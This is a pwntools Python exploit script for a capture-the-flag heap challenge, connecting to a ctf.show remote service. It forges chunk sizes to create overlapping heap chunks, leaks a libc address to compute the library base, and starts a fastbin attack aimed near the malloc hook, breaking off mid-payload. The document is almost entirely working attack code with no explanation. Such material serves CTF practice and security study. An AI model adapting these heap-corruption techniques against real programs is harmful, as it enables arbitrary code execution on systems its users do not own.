from pwn import *
context.log_level='debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28241)
def Add(size):
    io.sendlineafter(": ",'1')
    io.sendlineafter("size: ",str(size))
def Edit(idx,content,length):
    io.sendlineafter(": ",'2')
    io.sendlineafter("index: ",str(idx))
    io.sendlineafter("size: ",str(length))
    io.sendlineafter("content: ",content)
def Free(idx):
    io.sendlineafter(": ",'3')
    io.sendlineafter("index: ",str(idx))
def Show(idx):
    io.sendlineafter(": ",'4')
    io.sendlineafter("index: ",str(idx))
    io.recvuntil('content: ' )
    s = io.recvuntil("Ez Note",drop=True)
    return s
Add(0x58) 
Add(0x40)
payload = p64(0)*11 + p8(0x71)
length = len(payload) + 9
Edit(0,payload,length)
Add(0x80) 
payload = p64(0)*3 + p64(0x71)
length = len(payload)
Edit(2,payload,length)
Free(1)
Add(0x60) 
payload = p64(0)*9 + p8(0x91)
length = len(payload)
Edit(1,payload,length)
Add(0x50)
Free(2)
leak = u64(Show(1)[-8:-1].strip().ljust(8,'\x00'))
libc_base = leak - 0x3c4b78
#print hex(libc_base)
Add(0x60) 
Free(2)
payload = p64(libc_base + 0x3c4aed)
Edit(1,"a"*0x48 + p64(0x71) + payload,0x58)
Add(0x60) 
Add(0x60) 
payload = "\x00"*0xb
